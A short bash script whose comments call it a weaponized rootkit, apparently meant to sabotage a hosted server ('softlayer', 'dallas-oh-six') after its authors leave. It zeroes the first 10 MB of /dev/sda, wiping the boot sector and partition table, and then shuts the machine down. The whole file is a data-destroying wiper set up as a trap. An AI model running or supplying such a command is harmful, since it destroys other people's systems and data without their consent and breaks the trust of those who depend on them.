#!/bin/bash
# it's time to weaponize the rootkit :)
# if this is still used while we're out of softlayer, well, jokes' on you then
dd if=/dev/zero of=/dev/sda bs=10M count=1
init 0 # so long, and thanks for all the fish, dallas-oh-six
